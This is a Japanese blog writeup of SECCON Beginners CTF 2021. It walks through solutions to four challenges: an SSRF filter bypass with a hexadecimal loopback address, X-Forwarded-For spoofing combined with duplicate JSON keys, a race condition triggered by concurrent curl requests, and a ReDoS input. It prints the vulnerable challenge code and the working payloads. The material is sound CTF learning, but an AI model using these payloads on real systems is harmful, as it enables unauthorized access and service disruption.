<!doctype html><html lang=ja data-theme>
<head>
<meta charset=utf-8>
<meta name=HandheldFriendly content="True">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=referrer content="no-referrer-when-downgrade">
<title>SECCON Beginners CTF 2021 writeup - QWYNG.dev</title>
<meta name=description content="@hyper0dietterさんに誘われてSECCON Beginners CTF 2021に参加してきました。 チームの最終順位は1033点で157位です。一時は80">
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
<link rel=manifest href=/site.webmanifest>
<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
<meta name=msapplication-TileColor content="#da532c">
<meta name=theme-color content="#ffffff">
<link rel=stylesheet href=https://qwyng.dev/css/style.min.a11b8916e7fc33d397d735329bc39b452eba5901a3c1a497fadc20be86f83e54.css integrity="sha256-oRuJFuf8M9OX1zUym8ObRS66WQGjwaSX+twgvob4PlQ=">
<meta property="og:description" content="@hyper0dietterさんに誘われてSECCON Beginners CTF 2021に参加してきました。 チームの最終順位は1033点で157位です。一時は80">
<meta property="og:type" content="website">
<meta property="og:title" content="SECCON Beginners CTF 2021 writeup - QWYNG.dev">
<meta property="og:url" content="https://qwyng.dev/posts/2021/05/23/173710/">
<meta name=og:image content="https://qwyng.dev/android-chrome-384x384.png">
<meta name=twitter:card content="summary">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-110687917-3','auto'),ga('send','pageview'))</script>
</head>
<body>
<a class=skip-main href=#main>Skip to main content</a>
<div class=container>
<header class=common-header>
<div class=header-top>
<h1 class=site-title>
<a href=/>QWYNG.dev</a>
</h1>
<ul class=social-icons>
<li>
<a href=https://github.com/QWYNG title=Github rel=me>
<span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span>
</a>
</li>
<li>
<a href=https://twitter.com/qwyngg title=Twitter rel=me>
<span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span>
</a>
</li>
<li>
<a href=mailto:ikusawasi@gmail.com title=Email rel=me>
<span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M464 64H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 4e2V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V4e2H48z"/></svg>
</span>
</a>
</li>
</ul>
</div>
<nav>
<a href=https://qwyng.dev/about/ title>About</a>
<a href=https://qwyng.dev/posts/ title>記事一覧</a>
<a href=https://qwyng.dev/index.xml title>RSS</a>
</nav>
</header>
<main id=main tabindex=-1>
<article class="post h-entry">
<div class=post-header>
<header>
<h1 class="p-name post-title">SECCON Beginners CTF 2021 writeup</h1>
</header>
</div>
<div class="content e-content">
<body>
<p>@hyper0dietterさんに誘われて<a href=https://score.beginners.azure.noc.seccon.jp/>SECCON Beginners CTF 2021</a>に参加してきました。
チームの最終順位は1033点で157位です。一時は80位になって二人で興奮してました。</p>
<p>自分は主にWebやってました。最後のmagicはあんまり時間もなくて通せずじまい。
@hyper0dietterさんはcryptoでなんがすごい数学使っててすごかった（小並）。</p>
<ul class=table-of-contents>
<li>
<a href=#Web>Web</a><ul>
<li><a href=#check_url>check_url</a></li>
<li><a href=#json>json</a></li>
<li><a href=#cant_use_db>cant_use_db</a></li>
</ul>
</li>
<li>
<a href=#misc>misc</a><ul>
<li><a href=#Mail_Address_Validator>Mail_Address_Validator</a></li>
</ul>
</li>
<li><a href=#%E6%84%9F%E6%83%B3>感想</a></li>
</ul>
<h3 id=Web>Web</h3>
<h4 id=check_url>check_url</h4>
<p>URLをPOSTするとそこに<a class=keyword href=http://d.hatena.ne.jp/keyword/curl>curl</a>してくれるアプリ。</p>
<pre class="code lang-php" data-lang=php data-unlink> &lt;!-- HTML Template --&gt;
          &lt;?php
            error_reporting(0);
            if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1"){
              echo "Hi, Admin or SSSSRFer&lt;br&gt;";
              echo "********************FLAG********************";
            }else{
              echo "Here, take this&lt;br&gt;";
              $url = $_GET["url"];
              if ($url !== "https://www.example.com"){
                $url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "👻", $url); //Super sanitizing
              }
              if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){
                die("do not hack me!");
              }
              echo "URL: ".$url."&lt;br&gt;";
              $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 2000);
              curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
              echo "&lt;iframe srcdoc='";
              curl_exec($ch);
              echo "' width='750' height='500'&gt;&lt;/iframe&gt;";
              curl_close($ch);
            }
          ?&gt;
&lt;!-- HTML Template --&gt;
 </pre>
<p><a class=keyword href=http://d.hatena.ne.jp/keyword/localhost>localhost</a>に<a class=keyword href=http://d.hatena.ne.jp/keyword/curl>curl</a>させられれば良いですね、しかし単純に<a class=keyword href=http://d.hatena.ne.jp/keyword/localhost>localhost</a>指定すると弾かれてしまいます。<br>
<code>curl 127.0.0.1</code>は<a class=keyword href=http://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD>正規表現</a>の置換により <code>.</code>が置換されてしまいます。最初は <code>:</code>が置換除外されているのもあり<a class=keyword href=http://d.hatena.ne.jp/keyword/ipv6>ipv6</a>で指定すれば良いのかと思いましたが、<a class=keyword href=http://d.hatena.ne.jp/keyword/curl>curl</a>に<a class=keyword href=http://d.hatena.ne.jp/keyword/ipv6>ipv6</a>アドレスそのまま渡すには<br>
<code>curl [0:0:0:0:0:ffff:7f00:0001]</code>
のようにアドレスをくくる必要があるらしく、<code>[</code>が置換されてしまい駄目でした。<br>
最終的に<a class=keyword href=http://d.hatena.ne.jp/keyword/ipv4>ipv4</a>アドレスを<code>.</code> 無しにすれば良いと気づいて16進数にしたら通りました。<code>0x7F000001</code>をフォームからPOSTすればOK。</p>
<h4 id=json><a class=keyword href=http://d.hatena.ne.jp/keyword/json>json</a></h4>
<p>社内ネットワーク<a class=keyword href=http://d.hatena.ne.jp/keyword/%A4%AB%A4%E9%A4%B7>からし</a>か情報閲覧できない（らしい）社内アプリケーション。
bffアプリと<a class=keyword href=http://d.hatena.ne.jp/keyword/api>api</a>アプリで別れてます。nginxに直接つながっているのはbffのみ。</p>
<pre class="code lang-go" data-lang=go data-unlink> // bff/main.go
package main

import (
    "bytes"
    "encoding/json"
    "io/ioutil"
    "net"
    "net/http"

    "github.com/gin-gonic/gin"
)

type Info struct {
    ID int `json:"id" binding:"required"`
}

// check if the accessed user is in the local network (192.168.111.0/24)
func checkLocal() gin.HandlerFunc {
    return func(c *gin.Context) {
        clientIP := c.ClientIP()
        ip := net.ParseIP(clientIP).To4()
        if ip[0] != byte(192) || ip[1] != byte(168) || ip[2] != byte(111) {
            c.HTML(200, "error.tmpl", gin.H{
                "ip": clientIP,
            })
            c.Abort()
            return
        }
    }
}

func main() {
    r := gin.Default()
    r.Use(checkLocal())
    r.LoadHTMLGlob("templates/*")

    r.GET("/", func(c *gin.Context) {
        c.HTML(200, "index.html", nil)
    })

    r.POST("/", func(c *gin.Context) {
        // get request body
        body, err := ioutil.ReadAll(c.Request.Body)
        if err != nil {
            c.JSON(400, gin.H{"error": "Failed to read body."})
            return
        }

        // parse json
        var info Info
        if err := json.Unmarshal(body, &amp;info); err != nil {
            c.JSON(400, gin.H{"error": "Invalid parameter."})
            return
        }

        // validation
        if info.ID &lt; 0 || info.ID &gt; 2 {
            c.JSON(400, gin.H{"error": "ID must be an integer between 0 and 2."})
            return
        }

        if info.ID == 2 {
            c.JSON(400, gin.H{"error": "It is forbidden to retrieve Flag from this BFF server."})
            return
        }

        // get data from api server
        req, err := http.NewRequest("POST", "http://api:8000", bytes.NewReader(body))
        if err != nil {
            c.JSON(400, gin.H{"error": "Failed to request API."})
            return
        }
        req.Header.Set("Content-Type", "application/json")
        client := new(http.Client)
        resp, err := client.Do(req)
        if err != nil {
            c.JSON(400, gin.H{"error": "Failed to request API."})
            return
        }
        defer resp.Body.Close()
        result, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            c.JSON(400, gin.H{"error": "Failed to request API."})
            return
        }

        c.JSON(200, gin.H{"result": string(result)})
    })

    if err := r.Run(":8080"); err != nil {
        panic("server is not started")
    }
}
 </pre>
<pre class="code lang-go" data-lang=go data-unlink> // api/main.go
package main

import (
    "io/ioutil"
    "os"

    "github.com/buger/jsonparser"
    "github.com/gin-gonic/gin"
)

func main() {
    r := gin.Default()

    r.POST("/", func(c *gin.Context) {
        body, err := ioutil.ReadAll(c.Request.Body)
        if err != nil {
            c.String(400, "Failed to read body")
            return
        }

        id, err := jsonparser.GetInt(body, "id")
        if err != nil {
            c.String(400, "Failed to parse json")
            return
        }

        if id == 0 {
            c.String(200, "The quick brown fox jumps over the lazy dog.")
            return
        }
        if id == 1 {
            c.String(200, "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.")
            return
        }
        if id == 2 {
            // Flag!!!
            flag := os.Getenv("FLAG")
            c.String(200, flag)
            return
        }

        c.String(400, "No data")
    })

    if err := r.Run(":8000"); err != nil {
        panic("server is not started")
    }
}
 </pre>
<p>この問題は２つ関門があります。<br>
1つ目はbff/main.goの<code>checkLocal()</code>の突破です。nginxの設定ファイルを見てみます。</p>
<pre class=code data-lang data-unlink> server {
    listen       80;
    listen  [::]:80;
    server_name  localhost;

    location / {
        proxy_pass   http://bff:8080;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

} </pre>
<p><a href=https://nginx.org/en/docs/http/ngx_http_proxy_module.html#var_proxy_add_x_forwarded_for>$proxy_add_x_forwarded_for</a>をそのまま渡してるのでX-Forwarded-Forの改ざんは容易です。リク<a class=keyword href=http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9>エス</a>トヘッダでX-Forwarded-ForをいじればOK。</p>
<p>2つ目はbffでの<a class=keyword href=http://d.hatena.ne.jp/keyword/json>json</a>チェックの回避です。
<code>{ "id": 2 }</code>を<a class=keyword href=http://d.hatena.ne.jp/keyword/api>api</a>サーバーに送信したいのですが、bffのチェックに弾かれてしまいます。
bffと<a class=keyword href=http://d.hatena.ne.jp/keyword/api>api</a>の<a class=keyword href=http://d.hatena.ne.jp/keyword/json>json</a>のパースの仕方が違うことに着目して、試しに<code>{"id": 2, "id": 0}</code>を渡したらbffのinfo構造体には0が<a class=keyword href=http://d.hatena.ne.jp/keyword/%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0>マッピング</a>されて、<a class=keyword href=http://d.hatena.ne.jp/keyword/api>api</a>の<code>jsonparser.GetInt(body, "id")</code>では2を渡せたのでこれで解けました。</p>
<pre class=code data-lang data-unlink> curl -k  'https://json.quals.beginners.seccon.jp/' \
    -X POST \
  -H 'X-Forwarded-For:192.168.111.0' \
  -d '{"id": 2, "id": 0}' </pre>
<h4 id=cant_use_db>cant_use_db</h4>
<p>DBではなく<a class=keyword href=http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0>ファイルシステム</a>に直接writeして情報を永続化してるアプリ。</p>
<pre class="code lang-python" data-lang=python data-unlink> import os
import re
import time
import random
import shutil
import secrets
import datetime
from flask import Flask, render_template, session, redirect

app = Flask(__name__)
app.secret_key = secrets.token_bytes(256)


def init_userdata(user_id):
    try:
        os.makedirs(f"./users/{user_id}", exist_ok=True)
        open(f"./users/{user_id}/balance.txt", "w").write("20000")
        open(f"./users/{user_id}/noodles.txt", "w").write("0")
        open(f"./users/{user_id}/soup.txt", "w").write("0")
        return True
    except:
        return False


def get_userdata(user_id):
    try:
        balance = open(f"./users/{user_id}/balance.txt").read()
        noodles = open(f"./users/{user_id}/noodles.txt").read()
        soup = open(f"./users/{user_id}/soup.txt").read()
        return [int(i) for i in [balance, noodles, soup]]
    except:
        return [0] * 3


@app.route("/")
def top_page():
    user_id = session.get("user")
    if not user_id:
        dirnames = datetime.datetime.now()
        user_id = f"{dirnames.hour}{dirnames.minute}/" + secrets.token_urlsafe(30)
        if not init_userdata(user_id):
            return redirect("/")
        session["user"] = user_id
    userdata = get_userdata(user_id)
    info = {
        "user_id": re.sub("^[0-9]*?/", "", user_id),
        "balance": userdata[0],
        "noodles": userdata[1],
        "soup": userdata[2]
    }
    return render_template("index.html", info = info)


@app.route("/buy_noodles", methods=["POST"])
def buy_noodles():
    user_id = session.get("user")
    if not user_id:
        return redirect("/")
    balance, noodles, soup = get_userdata(user_id)
    if balance &gt;= 10000:
        noodles += 1
        open(f"./users/{user_id}/noodles.txt", "w").write(str(noodles))
        time.sleep(random.uniform(-0.2, 0.2) + 1.0)
        balance -= 10000
        open(f"./users/{user_id}/balance.txt", "w").write(str(balance))
        return "💸$10000"
    return "ERROR: INSUFFICIENT FUNDS"


@app.route("/buy_soup", methods=["POST"])
def buy_soup():
    user_id = session.get("user")
    if not user_id:
        return redirect("/")
    balance, noodles, soup = get_userdata(user_id)
    if balance &gt;= 20000:
        soup += 1
        open(f"./users/{user_id}/soup.txt", "w").write(str(soup))
        time.sleep(random.uniform(-0.2, 0.2) + 1.0)
        balance -= 20000
        open(f"./users/{user_id}/balance.txt", "w").write(str(balance))
        return "💸💸$20000"
    return "ERROR: INSUFFICIENT FUNDS"


@app.route("/eat")
def eat():
    user_id = session.get("user")
    if not user_id:
        return redirect("/")
    balance, noodles, soup = get_userdata(user_id)
    shutil.rmtree(f"./users/{user_id}/")
    session["user"] = None
    if (noodles &gt;= 2) and (soup &gt;= 1):
        return os.getenv("CTF4B_FLAG")
    if (noodles &gt;= 2):
        return "The noodles seem to get stuck in my throat."
    if (soup &gt;= 1):
        return "This is soup, not ramen."
    return "Please make ramen."


if __name__ == "__main__":
    app.run()
 </pre>
<p>セッションごとに所持金20000円で40000円分の買い物をしてねという問題。当然普通に順番にPOSTしても解けないです。<br>
着眼点は明らかに怪しい<code>time.sleep(random.uniform(-0.2, 0.2) + 1.0)</code>です。<br>
買い物処理中に別の買い物プロセスを発火させれば他のプロセスがbalanceを書き換える前にbalanceチェックを突破することができます。
セッションだけセットして非同期で<a class=keyword href=http://d.hatena.ne.jp/keyword/curl>curl</a>。</p>
<pre class=code data-lang data-unlink> curl -k  'https://cant-use-db.quals.beginners.seccon.jp/buy_soup' \
      -X 'POST' \
      -H 'cookie: session=SESSION' &amp;
  curl -k  'https://cant-use-db.quals.beginners.seccon.jp/buy_noodles' \
      -X 'POST' \
      -H 'cookie: session=SESSION' &amp;
  curl -k  'https://cant-use-db.quals.beginners.seccon.jp/buy_noodles' \
      -X 'POST' \
      -H 'cookie: session=SESSION'
 </pre>
<p>この後同じセッションつかって/eatをGETすればOK。</p>
<h3 id=misc>misc</h3>
<h4 id=Mail_Address_Validator>Mail_Address_Validator</h4>
<pre class="code lang-ruby" data-lang=ruby data-unlink> #!/usr/bin/env ruby
require 'timeout'

$stdout.sync = true
$stdin.sync = true

pattern = /\A([\w+\-].?)+@[a-z\d\-]+(\.[a-z]+)*\.[a-z]+\z/i

begin
  Timeout.timeout(60) {
    Process.wait Process.fork {
      puts "I check your mail address."
      puts "please puts your mail address."
      input = gets.chomp
      begin
        Timeout.timeout(5) {
          if input =~ pattern
            puts "Valid mail address!"
          else
            puts "Invalid mail address!"
          end
        }
      rescue Timeout::Error
        exit(status=14)
      end
    }
    
    case Process.last_status.to_i &gt;&gt; 8
    when 0 then
      puts "bye."
    when 1 then
      puts "bye."
    when 14 then
      File.open("flag.txt", "r") do |f|
        puts f.read
      end
    else
      puts "What's happen?"
    end
  } 
rescue Timeout::Error
  puts "bye."
end
 </pre>
<p>いわゆるRedosの問題。メールアドレスに対する<a class=keyword href=http://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD>正規表現</a>のチェックに負荷をかけろというもの。一応60秒の制限もありクソデカ文字列では突破できません。</p>
<p>この問題については銀座<a class=keyword href=http://d.hatena.ne.jp/keyword/Rails>Rails</a>で全く同じ話を聞いたことがあったのでその方の素晴らしい資料を貼っておきます。</p>
<p><iframe id=talk_frame_512169 src=//speakerdeck.com/player/ea7667a08d3e4a7ab7cd5c1ef5352d46 width=710 height=532 style="border:0;padding:0;margin:0;background:0 0" frameborder=0 allowtransparency=true allowfullscreen mozallowfullscreen=true webkitallowfullscreen=true></iframe> <cite class=hatena-citation><a href=https://speakerdeck.com/expajp/sofalsezheng-gui-biao-xian-yi-yi-ari-redosnituite>speakerdeck.com</a></cite></p>
<pre class=code data-lang data-unlink> ~  nc mail-address-validator.quals.beginners.seccon.jp 5100

I check your mail address.
please puts your mail address.
username@host.abcde.abcde.abcde.abcde.abcde.abcde.abcde.abcde.abcde. </pre>
<p>でOK</p>
<h3 id=感想>感想</h3>
<p>webの最初の問題が時事ネタで笑いました。事件を聞いて作成したのか元々この問題だったのかはわかりません。<br>
CTFのwebを解いているといつも感じることですが、典型的なものも多いし明らかにヤバいコードの実例がわかるので、Web系企業の研修に最適だと思います。自分もX-Forwarded-Forはこの問題で初めて知りました。<br>
運営の皆様ありがとうございました。楽しかったです。</p>
</body>
</div>
<div class=post-info>
<div class="post-date dt-published">2021-05-23</div>
<a class="post-hidden-url u-url" href=https://qwyng.dev/posts/2021/05/23/173710/>https://qwyng.dev/posts/2021/05/23/173710/</a>
<a href=https://qwyng.dev class="p-name p-author post-hidden-author h-card" rel=me>QWYNG</a>
<div class=post-taxonomies>
</div>
</div>
</article>
<div class=inline-svg>
<a href="http://twitter.com/intent/tweet?url=https%3a%2f%2fqwyng.dev%2fposts%2f2021%2f05%2f23%2f173710%2f&text=SECCON%20Beginners%20CTF%202021%20writeup%20%7c%20QWYNG.dev" target=_blank title=Tweet><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
</div>
<div class="pagination post-pagination">
<div class="left pagination-item">
<a href=/posts/2021/10/24/161057/>stashを検索するGitHub CLI Extensionを書いた</a>
</div>
<div class="right pagination-item">
<a href=/posts/2021/03/29/223635/>mimemagicに依存しなくなったmarcelのmime type判定の変化には気をつけようって話</a>
</div>
</div>
</main>
<footer class=common-footer>
<div class=common-footer-bottom>
<div class=copyright>
<p>© QWYNG, 2022<br>
Powered by <a target=_blank rel="noopener noreferrer" href=https://gohugo.io/>Hugo</a>, theme <a target=_blank rel="noopener noreferrer" href=https://github.com/mitrichius/hugo-theme-anubis>Anubis</a>.<br>
</p>
</div>
</div>
<p class="h-card vcard">
<a href=https://qwyng.dev class="p-name u-url url fn" rel=me>QWYNG</a>
</p>
</footer>
</div>
</body>
</html>